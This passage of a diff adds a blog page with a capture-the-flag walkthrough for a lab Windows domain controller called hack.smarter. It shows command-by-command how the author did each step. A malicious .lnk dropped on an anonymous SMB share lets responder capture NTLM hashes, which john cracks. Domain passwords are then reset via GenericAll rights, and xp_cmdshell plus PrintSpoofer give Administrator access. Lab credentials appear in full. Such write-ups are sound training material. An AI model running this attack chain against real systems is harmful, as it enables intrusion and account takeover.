+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2025-09-05T03:46:00
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2026-03-07T03:46:00
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   4b40:6c01:63f1:81e4:4f56:64b7:8ef3:4bbc
+</span></span><span class="line"><span class="cl"><span class="p">|</span> SHA-1: 2ad1:c7dc:ab46:ae72:570a:ea85:2192:51cf:1707:3692
+</span></span><span class="line"><span class="cl"><span class="p">|</span> -----BEGIN CERTIFICATE-----
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MIIC5jCCAc6gAwIBAgIQL7/TDfsBKaJEuIxvqLtNeDANBgkqhkiG9w0BAQsFADAc
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MRowGAYDVQQDExFEQzAxLmhhY2suc21hcnRlcjAeFw0yNTA5MDUwMzQ2MDBaFw0y
+</span></span><span class="line"><span class="cl"><span class="p">|</span> NjAzMDcwMzQ2MDBaMBwxGjAYBgNVBAMTEURDMDEuaGFjay5zbWFydGVyMIIBIjAN
+</span></span><span class="line"><span class="cl"><span class="p">|</span> BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAr/z97jkoYVuqCfcPuR2gCVRNgSK+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MB7v2Nxa64USo34Z8OzT758ox5d7FFrmZSm3A0bvUNtVYjw4qAekjAYNCSCZO1JI
+</span></span><span class="line"><span class="cl"><span class="p">|</span> GVDjieej7jRyApmXOCnV82Pp0pDZuc/v8hg1X1JNeXlI4vgi4cVXIQk2Cg6ljjap
+</span></span><span class="line"><span class="cl"><span class="p">|</span> DRcm2JARZ8gNFvn/VbDTBpipp2nFIENtCM0wwslxI4SGbx8+GisHqOwt0tbelpuL
+</span></span><span class="line"><span class="cl"><span class="p">|</span> JQ+uQPoddL45Fz7uQ/Pp/5nnqmtR/6yAR2jFir3v5/hZ7zycPCTlAocRth6azFW2
+</span></span><span class="line"><span class="cl"><span class="p">|</span> UTke69SByvN+BJdgP2QbyXWcJHwX0GatenQCzht4ZCq0O2CsX9+7+lPKbQIDAQAB
+</span></span><span class="line"><span class="cl"><span class="p">|</span> oyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcN
+</span></span><span class="line"><span class="cl"><span class="p">|</span> AQELBQADggEBAAVQZIet+fvKcDwhSGcITFyO7RHjL51Q0aauioSdlow50XVGZ8vW
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ptOhb5GwWmGfo8abmKZO8mqK/SkaNU6pA7zwvBHVUqwWF2bMKyWKMBLOB0VIQaxT
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ZfV0LL8KR3oCs1fuC60rxDF8JIEne9vgL5z+dmgxXd6SZJf1//ZPjmUf7ai3ohtg
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MRq87WZuf2P7m2rZaPcIcyMDM0Zt5MSGr+bD9V2AboDrKh6TYrz4ODkNPUbeGyT/
+</span></span><span class="line"><span class="cl"><span class="p">|</span> q57XlN2ERF6OYCYAGpLdCDxHmAhQhihKbxtnC4vwhUCaXnDUSD2v+9WYbrFmWMNl
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="nv">UCJT2ircDq6fnW4O9KJJhg5udslgzhQcT3Y</span><span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_-----END CERTIFICATE-----
+</span></span><span class="line"><span class="cl"><span class="p">|</span> rdp-ntlm-info:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Target_Name: HACK
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS_Domain_Name: HACK
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS_Computer_Name: DC01
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNS_Domain_Name: hack.smarter
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNS_Computer_Name: DC01.hack.smarter
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNS_Tree_Name: hack.smarter
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Product_Version: 10.0.20348
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  System_Time: 2025-09-21T15:40:10+00:00
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2025-09-21T15:40:19+00:00<span class="p">;</span> -1s from scanner time.
+</span></span><span class="line"><span class="cl">5985/tcp  open  http          syn-ack ttl <span class="m">126</span> Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl">9389/tcp  open  mc-nmf        syn-ack ttl <span class="m">126</span> .NET Message Framing
+</span></span><span class="line"><span class="cl">49664/tcp open  msrpc         syn-ack ttl <span class="m">126</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49665/tcp open  msrpc         syn-ack ttl <span class="m">126</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49666/tcp open  msrpc         syn-ack ttl <span class="m">126</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49669/tcp open  msrpc         syn-ack ttl <span class="m">126</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49671/tcp open  msrpc         syn-ack ttl <span class="m">126</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49675/tcp open  ncacn_http    syn-ack ttl <span class="m">126</span> Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">49711/tcp open  msrpc         syn-ack ttl <span class="m">126</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49837/tcp open  msrpc         syn-ack ttl <span class="m">126</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">Service Info: Host: DC01<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: -1s, deviation: 0s, median: -1s
+</span></span><span class="line"><span class="cl"><span class="p">|</span> p2p-conficker:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Checking <span class="k">for</span> Conficker.C or higher...
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Check <span class="m">1</span> <span class="o">(</span>port 33722/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Couldn<span class="s1">&#39;t connect)
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   Check 2 (port 13752/tcp): CLEAN (Couldn&#39;</span>t connect<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Check <span class="m">3</span> <span class="o">(</span>port 4466/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Check <span class="m">4</span> <span class="o">(</span>port 31274/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Failed to receive data<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  0/4 checks are positive: Host is CLEAN or ports are blocked
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2025-09-21T15:40:11
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   3:1:1:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We add the domain and FQDN to <code>/etc/hosts</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;&lt;your-box-ip&gt; hack.smarter DC01.hack.smarter&#39;</span> <span class="p">|</span> sudo tee -a /etc/hosts
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/sharethepainad/img/1.png"
+	width="1520"
+	height="371"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="409"
+		data-flex-basis="983px"
+	
+></p>
+<p>We have anonymous read and write access to the SMB share named &lsquo;Share&rsquo;.</p>
+<p><img src="/p/sharethepainad/img/2.png"
+	width="1708"
+	height="858"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="199"
+		data-flex-basis="477px"
+	
+></p>
+<p>We get xct&rsquo;s <a class="link" href="https://github.com/xct/hashgrab"  target="_blank" rel="noopener"
+    >hashgrab</a> to grab NTLM hashes.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">wget https://raw.githubusercontent.com/xct/hashgrab/refs/heads/main/hashgrab.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/sharethepainad/img/3.png"
+	width="1866"
+	height="333"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="560"
+		data-flex-basis="1344px"
+	
+></p>
+<p>First, we create the files using our <code>tun0</code> IP address and a file name.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python hashgrab.py &lt;your-ip&gt; Raises_Q4
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/sharethepainad/img/4.png"
+	width="940"
+	height="220"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="427"
+		data-flex-basis="1025px"
+	
+></p>
+<p>Then, we start up <code>responder</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo responder -I tun0
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We connect to the share using <code>smbclient.py</code> with no password.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">smbclient.py hack.smarter/anonymous@DC01.hack.smarter
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shares
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">use share
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/sharethepainad/img/5.png"
+	width="1868"
+	height="603"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="309"
+		data-flex-basis="743px"
+	
+></p>
+<p>We upload our malicious <code>.lnk</code> file.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">lls
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">put Raises_Q4.lnk
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/sharethepainad/img/6.png"
+	width="1438"
+	height="381"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="377"
+		data-flex-basis="905px"
+	
+></p>
+<p>After a few moments, we get a hit on responder.</p>
+<p><img src="/p/sharethepainad/img/7.png"
+	width="1417"
+	height="550"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="257"
+		data-flex-basis="618px"
+	
+></p>
+<p>We copy bob.ross&rsquo;s hash to a file, and run <code>john</code> to crack the password.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">john bob.ross-hash --wordlist=/usr/share/wordlists/rockyou.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/sharethepainad/img/8.png"
+	width="1338"
+	height="248"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="539"
+		data-flex-basis="1294px"
+	
+></p>
+<h2 id="foothold">
+    <a href="#foothold" class="header-anchor">#</a>
+    Foothold
+</h2><p>We run <a class="link" href="https://github.com/SySS-Research/Single-User-BloodHound"  target="_blank" rel="noopener"
+    >bloodhound</a> and find that bob.ross has GenericAll on alice.wonderland. Alice can log into the box because they&rsquo;re a member of the Remote Management Users.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">bloodhound-ce-python -d hack.smarter -u &#39;bob.ross&#39; -p &#39;137Password123!@#&#39; -ns &lt;your-box-ip&gt; -c all --zip
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/sharethepainad/img/9.png"
+	width="1424"
+	height="471"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="302"
+		data-flex-basis="725px"
+	
+></p>
+<p><img src="/p/sharethepainad/img/010.png"
+	width="1087"
+	height="657"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="165"
+		data-flex-basis="397px"
+	
+></p>
+<p><img src="/p/sharethepainad/img/011.png"
+	width="1092"
+	height="665"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="164"
+		data-flex-basis="394px"
+	
+></p>
+<p><img src="/p/sharethepainad/img/012.png"
+	width="1100"
+	height="668"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="164"
+		data-flex-basis="395px"
+	
+></p>
+<p>We&rsquo;ll change Alice&rsquo;s password, and log in to get the user flag.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">net rpc password &#34;alice.wonderland&#34; &#34;newP@ssword2025&#34; -U &#34;hack.smarter&#34;/&#34;bob.ross&#34;%&#39;137Password123!@#&#39; -S &#34;DC01.hack.smarter&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">evil-winrm -i 10.0.21.103 -u alice.wonderland -p newP@ssword2025
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/sharethepainad/img/013.png"
+	width="1089"
+	height="416"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="261"
+		data-flex-basis="628px"
+	
+></p>
+<h2 id="privilege-escalation">
+    <a href="#privilege-escalation" class="header-anchor">#</a>
+    Privilege Escalation
+</h2><p>We find a folder called &lsquo;SQL2019&rsquo; in the C:\ directory.</p>
+<p><img src="/p/sharethepainad/img/015.png"
+	width="962"
+	height="445"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="216"
+		data-flex-basis="518px"
+	
+></p>
+<p>We find MSSQL running on port 1433.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Get-Process -Name sqlservr
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">netstat -ano | findstr /i LISTENING
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/sharethepainad/img/014.png"
+	width="1010"
+	height="1055"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="95"
+		data-flex-basis="229px"
+	
+></p>
+<p>Wee see alice.wonderland is the current user on MSSQL 2019</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlcmd -S tcp:127.0.0.1,1433 -E -Q &#34;SELECT SUSER_SNAME() AS CurrentUser, @@VERSION AS Version;&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/sharethepainad/img/016.png"
+	width="1860"
+	height="353"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="526"
+		data-flex-basis="1264px"
+	
+></p>
+<p>We try to read the Administrator&rsquo;s flag, but get denied.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlcmd -S tcp:127.0.0.1,1433 -E -Q &#34;EXEC xp_cmdshell &#39;type C:\Users\Administrator\Desktop\root.txt&#39;;&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/sharethepainad/img/017.png"
+	width="1739"
+	height="216"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="805"
+		data-flex-basis="1932px"
+	
+></p>
+<p>We have <code>SeImpersonatePrivilege</code> privileges so we can use <a class="link" href="https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe"  target="_blank" rel="noopener"
+    >PrintSpoofer</a> to change the Administrator&rsquo;s password.</p>
+<p><img src="/p/sharethepainad/img/018.png"
+	width="1373"
+	height="555"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="247"
+		data-flex-basis="593px"
+	
+></p>
+<p>We get <code>PrintSpoofer.exe</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">wget</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">itm4n</span><span class="o">/</span><span class="n">PrintSpoofer</span><span class="o">/</span><span class="n">releases</span><span class="o">/</span><span class="n">download</span><span class="o">/</span><span class="n">v1</span><span class="o">.</span><span class="mi">0</span><span class="o">/</span><span class="n">PrintSpoofer64</span><span class="o">.</span><span class="n">exe</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/sharethepainad/img/019.png"
+	width="1527"
+	height="758"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="201"
+		data-flex-basis="483px"
+	
+></p>
+<p>Then, we upload the file to the victim&rsquo;s C:\ProgramData folder.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cd c:\programdata
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">upload</span> <span class="n">PrintSpoofer64</span><span class="o">.</span><span class="n">exe</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/sharethepainad/img/020.png"
+	width="1573"
+	height="167"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="941"
+		data-flex-basis="2260px"
+	
+></p>
+<p>We run into qoutation errors when we try to change the Administrator&rsquo;s password.</p>
+<p><img src="/p/sharethepainad/img/021.png"
+	width="1521"
+	height="160"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="950"
+		data-flex-basis="2281px"
+	
+></p>
+<p>We create a <code>do.cmd</code> file to make things easier.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Set-Content -Path c:\programdata\do.cmd -Value &#39;net user Administrator bluew@shere1&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">type do.cmd
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/sharethepainad/img/022.png"
+	width="1290"
+	height="171"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="754"
+		data-flex-basis="1810px"
+	
+></p>
+<p>We change the Administrator&rsquo;s password, and login to get the root flag.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlcmd -S tcp:127.0.0.1,1433 -E -Q &#34;EXEC xp_cmdshell &#39;C:\ProgramData\PrintSpoofer64.exe -c C:\programdata\do.cmd&#39;;&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/sharethepainad/img/023.png"
+	width="1521"
+	height="316"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="481"
+		data-flex-basis="1155px"
+	
+></p>
+<p><img src="/p/sharethepainad/img/024.png"
+	width="1425"
+	height="574"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="248"
+		data-flex-basis="595px"
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/jeeves/">
+        
+        
+            <div class="article-image">
+                <img src="/p/jeeves/img/jeeves-icon.aa783c41141fe2a0afd5c54c1c709ac6_hu_16ffec5202558f5c.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Jeeves"
+                        
+                        data-hash="md5-qng8QRQf4qCv1cVMHHCaxg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Jeeves</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/mr.-robot-ctf/">
+        
+        
+            <div class="article-image">
+                <img src="/p/mr.-robot-ctf/img/mr-robot.31508dd8a02385d9223d2e67d9eefb63_hu_10e70b0c2ce699d.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Mr. Robot CTF"
+                        
+                        data-hash="md5-MVCN2KAjhdkiPS5n2e77Yw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Mr. Robot CTF</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2024 - 
+        
+        2025 Blue Pho3nix
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.25.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
